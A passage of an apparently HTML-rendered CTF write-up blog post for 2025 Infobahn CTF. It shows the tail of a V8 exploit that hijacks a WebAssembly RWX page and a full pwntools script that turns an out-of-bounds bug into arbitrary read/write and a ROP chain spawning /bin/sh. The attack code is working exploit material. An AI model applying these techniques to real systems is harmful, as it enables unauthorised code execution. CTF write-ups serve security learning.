class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> shell = wasm_instance.<span class="property">exports</span>.<span class="property">shell</span>;</span><br><span class="line"><span class="keyword">var</span> trigger = wasm_instance.<span class="property">exports</span>.<span class="property">trigger</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">shell</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> leak = <span class="title function_">read64</span>(<span class="title function_">addrof</span>(wasm_instance) + <span class="number">0xcn</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(leak.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> rwx_addr = <span class="title function_">read64</span>(leak + <span class="number">0x28n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(rwx_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title function_">write64</span>(leak + <span class="number">0x28n</span>, rwx_addr + <span class="number">0x9den</span>);</span><br><span class="line"><span class="title function_">trigger</span>();</span><br></pre></td></tr></table></figure>
+
+<p>V8 challenge gives you a bitflip one time to an out-of-bounds element.</p>
+<h2 id="Pwn-A-Brainrot-5-solves"><a href="#Pwn-A-Brainrot-5-solves" class="headerlink" title="Pwn A Brainrot (5 solves)"></a>Pwn A Brainrot (5 solves)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;brainrot.challs.infobahnc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./brainrot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x4000_0000_1000_0000</span>))</span><br><span class="line"></span><br><span class="line">base_ptr = <span class="number">0x000000c00001a000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_index</span>(<span class="params">ptr</span>):</span><br><span class="line">    offset = ptr - base_ptr</span><br><span class="line">    <span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">        offset += <span class="number">0x1_0000_0000_0000_0000</span></span><br><span class="line">    <span class="keyword">return</span> offset // <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read32</span>(<span class="params">ptr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(calc_index(ptr)))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">    result = p.recvuntil(<span class="string">&#x27;/&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read64</span>(<span class="params">ptr</span>):</span><br><span class="line">    <span class="keyword">return</span> read32(ptr) + (read32(ptr + <span class="number">4</span>) &lt;&lt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">steal_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">steal</span>(<span class="params">index, name</span>):</span><br><span class="line">    <span class="keyword">global</span> steal_count</span><br><span class="line"></span><br><span class="line">    steal_count += <span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write32</span>(<span class="params">ptr, value</span>):</span><br><span class="line">    current = read32(ptr)</span><br><span class="line"></span><br><span class="line">    diff = value - current</span><br><span class="line">    <span class="keyword">if</span> diff &lt; <span class="number">0</span>:</span><br><span class="line">        diff += <span class="number">0x1_0000_0000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;value: <span class="subst">&#123;<span class="built_in">hex</span>(value)&#125;</span>, current: <span class="subst">&#123;<span class="built_in">hex</span>(current)&#125;</span>, diff: <span class="subst">&#123;<span class="built_in">hex</span>(diff)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> diff &gt;= <span class="number">1000000</span>:</span><br><span class="line">            steal(calc_index(ptr), <span class="string">&#x27;Chimpanzini Bananini&#x27;</span>)</span><br><span class="line">            diff -= <span class="number">1000000</span></span><br><span class="line">        <span class="keyword">elif</span> diff &gt;= <span class="number">100000</span>:</span><br><span class="line">            steal(calc_index(ptr), <span class="string">&#x27;Orcalero Orcala&#x27;</span>)</span><br><span class="line">            diff -= <span class="number">100000</span></span><br><span class="line">        <span class="keyword">elif</span> diff &gt;= <span class="number">10000</span>:</span><br><span class="line">            steal(calc_index(ptr), <span class="string">&#x27;Odin Din Din Dun&#x27;</span>)</span><br><span class="line">            diff -= <span class="number">10000</span></span><br><span class="line">        <span class="keyword">elif</span> diff &gt;= <span class="number">1000</span>:</span><br><span class="line">            steal(calc_index(ptr), <span class="string">&#x27;Job Job Job Sahur&#x27;</span>)</span><br><span class="line">            diff -= <span class="number">1000</span></span><br><span class="line">        <span class="keyword">elif</span> diff &gt;= <span class="number">100</span>:</span><br><span class="line">            steal(calc_index(ptr), <span class="string">&#x27;John Pork&#x27;</span>)</span><br><span class="line">            diff -= <span class="number">100</span></span><br><span class="line">        <span class="keyword">elif</span> diff &gt;= <span class="number">10</span>:</span><br><span class="line">            steal(calc_index(ptr), <span class="string">&#x27;Ballerina Cappuccina&#x27;</span>)</span><br><span class="line">            diff -= <span class="number">10</span></span><br><span class="line">        <span class="keyword">elif</span> diff &gt;= <span class="number">1</span>:</span><br><span class="line">            steal(calc_index(ptr), <span class="string">&#x27;Meowl&#x27;</span>)</span><br><span class="line">            diff -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> diff == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># print(&#x27;good&#x27;)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            steal(calc_index(ptr), <span class="string">&#x27;Meowl&#x27;</span>)</span><br><span class="line">            diff -= <span class="number">67676767</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write64</span>(<span class="params">ptr, value</span>):</span><br><span class="line">    lo = value &amp; <span class="number">0xffffffff</span></span><br><span class="line">    hi = value &gt;&gt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    write32(ptr, lo)</span><br><span class="line">    write32(ptr + <span class="number">4</span>, hi)</span><br><span class="line"></span><br><span class="line">stack = read64(<span class="number">0xa98398</span>)</span><br><span class="line">pop_rcx_rsi = <span class="number">0x0000000000671d93</span></span><br><span class="line">pop_rdi = <span class="number">0x634cb7</span></span><br><span class="line">pop_rsi = <span class="number">0x64a120</span></span><br><span class="line">pop_rdx = <span class="number">0x662b1a</span></span><br><span class="line">binsh = <span class="number">0xa96bd8</span></span><br><span class="line">execve = <span class="number">0x665BB0</span></span><br><span class="line">mov_edx_0 = <span class="number">0x64781f</span></span><br><span class="line"></span><br><span class="line">write64(binsh, u64(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))</span><br><span class="line">write64(stack - <span class="number">0x50</span>, pop_rcx_rsi)</span><br><span class="line">write64(stack - <span class="number">0x38</span>, mov_edx_0)</span><br><span class="line">write64(stack - <span class="number">0x30</span>, pop_rdi)</span><br><span class="line">write64(stack - <span class="number">0x28</span>, binsh)</span><br><span class="line">write64(stack - <span class="number">0x20</span>, execve)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>You can leak the addresses and overwrite everything with one out-of-bounds bug.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSet-25-solves"><span class="toc-number">1.</span> <span class="toc-text">PwnSet (25 solves)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Book-Manager-V2-17-solves"><span class="toc-number">2.</span> <span class="toc-text">Book Manager V2 (17 solves)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Butterfly-Effect-14-solves"><span class="toc-number">3.</span> <span class="toc-text">The Butterfly Effect (14 solves)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn-A-Brainrot-5-solves"><span class="toc-number">4.</span> <span class="toc-text">Pwn A Brainrot (5 solves)</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&text=2025 Infobahn CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&title=2025 Infobahn CTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&is_video=false&description=2025 Infobahn CTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2025 Infobahn CTF&body=Check out this article: https://blog.6p.is/2025/11/09/2025-infobahn-ctf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&title=2025 Infobahn CTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&title=2025 Infobahn CTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&title=2025 Infobahn CTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&title=2025 Infobahn CTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&name=2025 Infobahn CTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&t=2025 Infobahn CTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Xisop
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
